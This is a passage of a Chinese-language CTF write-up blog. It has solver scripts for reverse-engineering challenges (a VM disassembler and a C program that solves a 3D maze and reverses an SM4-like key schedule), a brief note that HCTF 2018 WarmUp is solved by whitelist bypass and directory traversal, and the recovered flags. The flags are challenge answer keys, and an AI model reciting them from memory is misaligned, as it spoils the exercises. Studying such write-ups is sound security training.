class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">18</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=stack[DA5BD0+reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=DA5BA8[reg[%d]]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">0xFF</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">7</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">oth = [ord(<span class="string">&#x27;&#123;&#x27;</span>),ord(<span class="string">&#x27;&#125;&#x27;</span>),ord(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">2</span>):</span><br><span class="line">    t = a[i]*<span class="number">16</span>+a[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> oth:</span><br><span class="line">        flag+=chr(t)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">75</span>&gt;=<span class="number">65</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">75</span>&lt;=<span class="number">90</span>:</span><br><span class="line">        flag+=chr((t+<span class="number">1</span>)^<span class="number">75</span>)</span><br><span class="line">    <span class="keyword">elif</span> (t+<span class="number">1</span>)^<span class="number">71</span>&gt;=<span class="number">97</span> <span class="keyword">and</span> (t+<span class="number">1</span>)^<span class="number">71</span>&lt;=<span class="number">122</span>:</span><br><span class="line">        flag+=chr((t<span class="number">-1</span>)^<span class="number">71</span>)</span><br><span class="line">print(flag[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>

<p>flag{Such_A_EZVM}</p>
<h2 id="web-HCTF-2018-WarmUp"><a href="#web-HCTF-2018-WarmUp" class="headerlink" title="[web][HCTF 2018]WarmUp"></a>[web][HCTF 2018]WarmUp</h2><ol>
<li>打开注释，发现source.php</li>
<li>发现hint.php</li>
<li>要求在白名单内</li>
<li>需要目录穿越<br>flag{5cae09d5-ee32-4ee4-806a-519032a92250}</li>
</ol>
<h2 id="rev-SCTF2019-babyre"><a href="#rev-SCTF2019-babyre" class="headerlink" title="[rev][SCTF2019]babyre"></a>[rev][SCTF2019]babyre</h2><ol>
<li><p>flag存在3段</p>
</li>
<li><p>第一段是走一个三维迷宫，实在懒得走了，写了个脚本，深度优先搜索走迷宫，结果脚本找到了程序的另一条路= =</p>
<p>明白了，这一问是基于三维迷宫做的，所以应该改进脚本基于三维迷宫</p>
</li>
<li><p>第二段flag是base64解码，所以只需要把base64编码的那段东西放进去就行</p>
</li>
<li><p>第三段是仿sm4加密</p>
<p>这里太不认真了ROR6看成了ROL6</p>
</li>
</ol>
<p>脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> direc[] = &#123; <span class="number">-5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">25</span>,<span class="number">-25</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> direcc[] = <span class="string">&quot;wsdaxy&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> pos = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* v;</span><br><span class="line"><span class="keyword">char</span> state[<span class="number">126</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; <span class="number">0</span> || pos &gt;= <span class="built_in">strlen</span>(v))<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;*&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(state[pos]!=<span class="string">&#x27;.&#x27;</span>&amp;&amp;state[pos]!=<span class="string">&#x27;s&#x27;</span>)<span class="keyword">return</span>;</span><br><span class="line">    state[pos] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        pos += direc[i];</span><br><span class="line">        flag[cnt++] = direcc[i];</span><br><span class="line">        search();</span><br><span class="line">        cnt--;</span><br><span class="line">        pos -= direc[i];</span><br><span class="line">    &#125;</span><br><span class="line">    state[pos] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> sbox[] = &#123; <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x5</span>, <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x6</span>, <span class="number">0x99</span>, <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0xb</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x47</span>, <span class="number">0x7</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>, <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0xf</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0xe</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x1</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xd4</span>, <span class="number">0x0</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x2</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>, <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>, <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>, <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0xd</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>, <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x3</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>, <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>, <span class="number">0xa</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0xc</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x9</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0xc6</span>, <span class="number">0xba</span>, <span class="number">0xb1</span>, <span class="number">0xa3</span>, <span class="number">0x50</span>, <span class="number">0x33</span>, <span class="number">0xaa</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x91</span>, <span class="number">0x7d</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x70</span>, <span class="number">0xb2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROL32(x,i) ((x)<span class="meta-string">&lt;&lt;(i)|(((unsigned int)(x)&gt;&gt;(32-(i)))))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tau(x) ((sbox[((x)&gt;&gt;16)&amp;0xFF]<span class="meta-string">&lt;&lt;16)|sbox[(x)&amp;0xFF]|(sbox[((x)&gt;&gt;8)&amp;0xFF]&lt;&lt;8)|(sbox[((x)&gt;&gt;24&amp;0xFF)]&lt;&lt;24))</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L(x) ((ROL32((x),12))^(ROL32((x),8))^(ROL32((x),30))^(ROL32((x),26)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v28[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    v28[<span class="number">0</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">1</span>] = <span class="number">3039413159106062890L</span>L;</span><br><span class="line">    v28[<span class="number">2</span>] = <span class="number">3347065308717918762L</span>L;</span><br><span class="line">    v28[<span class="number">3</span>] = <span class="number">3038287259266591278L</span>L;</span><br><span class="line">    v28[<span class="number">4</span>] = <span class="number">3326517635351194154L</span>L;</span><br><span class="line">    v28[<span class="number">5</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">6</span>] = <span class="number">3038287276446198314L</span>L;</span><br><span class="line">    v28[<span class="number">7</span>] = <span class="number">3036321349588626990L</span>L;</span><br><span class="line">    v28[<span class="number">8</span>] = <span class="number">3039417557152575022L</span>L;</span><br><span class="line">    v28[<span class="number">9</span>] = <span class="number">3038287259199482410L</span>L;</span><br><span class="line">    v28[<span class="number">10</span>] = <span class="number">3038287259199220266L</span>L;</span><br><span class="line">    v28[<span class="number">11</span>] = <span class="number">3326517635350932010L</span>L;</span><br><span class="line">    v28[<span class="number">12</span>] = <span class="number">3038287259266591274L</span>L;</span><br><span class="line">    v28[<span class="number">13</span>] = <span class="number">3326517652597910058L</span>L;</span><br><span class="line">    v28[<span class="number">14</span>] = <span class="number">3039413176353041966L</span>L;</span><br><span class="line">    v28[<span class="number">15</span>] = <span class="number">0x2A2E2A2A2E</span>LL;</span><br><span class="line">    v = (<span class="keyword">char</span>*)v28;</span><br><span class="line">    <span class="built_in">memcpy</span>(state, v, <span class="number">126</span>);</span><br><span class="line"></span><br><span class="line">    search();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;,v28);</span></span><br><span class="line">    <span class="keyword">uint64_t</span> f2 = <span class="number">3472619869582943091L</span>L; <span class="comment">// sctf_910 019_ftcs</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123; <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3e</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x3f</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x40</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span>, <span class="number">0x7f</span> &#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dict[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a) / <span class="number">4</span>; i++) &#123;</span><br><span class="line">        dict[a[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dict);</span><br><span class="line">    <span class="keyword">uint32_t</span> v8[<span class="number">15</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">190</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">128</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">197</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">175</span>;</span><br><span class="line">    v8[<span class="number">6</span>] = <span class="number">118</span>;</span><br><span class="line">    v8[<span class="number">7</span>] = <span class="number">71</span>;</span><br><span class="line">    v8[<span class="number">8</span>] = <span class="number">159</span>;</span><br><span class="line">    v8[<span class="number">9</span>] = <span class="number">204</span>;</span><br><span class="line">    v8[<span class="number">10</span>] = <span class="number">64</span>;</span><br><span class="line">    v8[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line">    v8[<span class="number">12</span>] = <span class="number">216</span>;</span><br><span class="line">    v8[<span class="number">13</span>] = <span class="number">191</span>;</span><br><span class="line">    v8[<span class="number">14</span>] = <span class="number">146</span>;</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">239</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">30</span>];</span><br><span class="line">    k[<span class="number">29</span>] = v8[<span class="number">12</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">13</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">14</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">15</span>];</span><br><span class="line">    k[<span class="number">28</span>] = v8[<span class="number">8</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">9</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">10</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">11</span>];</span><br><span class="line">    k[<span class="number">27</span>] = v8[<span class="number">4</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">5</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">6</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">7</span>];</span><br><span class="line">    k[<span class="number">26</span>] = v8[<span class="number">0</span>] &lt;&lt; <span class="number">24</span> | v8[<span class="number">1</span>] &lt;&lt; <span class="number">16</span> | v8[<span class="number">2</span>] &lt;&lt; <span class="number">8</span> | v8[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> t = k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> t1 = tau(t);</span><br><span class="line">        <span class="keyword">uint32_t</span> t2 = L(t1);</span><br><span class="line">        <span class="comment">// printf(&quot;0x%x\n&quot;,t2);</span></span><br><span class="line">        k[i] = k[i+<span class="number">4</span>] ^ t2;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(&#x27;key&#x27;,k,16);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,k);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)}</p>
<h2 id="rev-WUSTCTF2020-funnyre"><a href="#rev-WUSTCTF2020-funnyre" class="headerlink" title="[rev][WUSTCTF2020]funnyre"></a>[rev][WUSTCTF2020]funnyre</h2><ol>
<li><p>进入主函数</p>
</li>
<li><p>发现一大堆xor,add,++,~处理</p>
</li>
<li><p>拷贝所有反编译后的代码，使用正则表达式处理，得到以下一些东西</p>
